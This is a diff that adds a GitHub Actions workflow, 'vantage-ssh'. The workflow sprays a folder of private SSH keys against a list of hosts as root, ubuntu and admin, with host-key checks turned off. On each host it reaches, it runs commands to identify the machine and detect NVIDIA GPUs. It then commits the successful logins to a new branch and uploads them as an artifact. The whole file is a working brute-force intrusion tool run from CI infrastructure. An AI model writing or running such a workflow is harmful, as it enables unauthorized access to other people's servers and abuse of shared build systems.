@@ -1,0 +1,58 @@
+name: vantage-ssh
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  ssh:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+      - name: egress
+        run: curl -s -m 10 https://api.ipify.org; echo
+      - name: ssh-brute-bounded
+        run: |
+          set +e
+          mkdir -p vantage/out
+          OUT=vantage/out/ssh.tsv
+          : > $OUT
+          for k in keys2/*; do
+            chmod 600 "$k" 2>/dev/null
+            # skip obviously non-keys
+            head -c 40 "$k" | grep -q "PRIVATE KEY" || continue
+          done
+          for host in $(cat vantage/ssh_hosts.txt); do
+            for user in root ubuntu admin; do
+              for k in keys2/*; do
+                head -c 40 "$k" | grep -q "PRIVATE KEY" || continue
+                R=$(timeout 12 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                    -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes \
+                    -o PreferredAuthentications=publickey "$user@$host" \
+                    'id; hostname; nvidia-smi -L 2>/dev/null | head -8; ls /dev/nvidia* 2>/dev/null | wc -l' 2>&1)
+                rc=$?
+                if [ $rc -eq 0 ]; then
+                  echo -e "$host\t$user\t$k\tOK\t$(echo "$R" | tr '\n' '|')" | tee -a $OUT
+                elif echo "$R" | grep -qiE "Permission denied|no such|Too many|Connection refused|timed out|No route"; then
+                  :
+                else
+                  echo -e "$host\t$user\t$k\tRC$rc\t$(echo "$R" | head -2 | tr '\n' '|')" >> $OUT
+                fi
+              done
+            done
+          done
+          echo "=== RESULT ==="; cat $OUT
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: vssh
+          path: vantage/out/ssh.tsv
+      - name: publish
+        if: always()
+        run: |
+          set +e
+          git config user.email bot@ul.local; git config user.name ul
+          git checkout -b vssh/${{ github.run_id }}
+          git add -f vantage/out/ssh.tsv
+          git commit -m "vssh ${{ github.run_id }}"
+          git push -q origin HEAD:vssh/${{ github.run_id }}
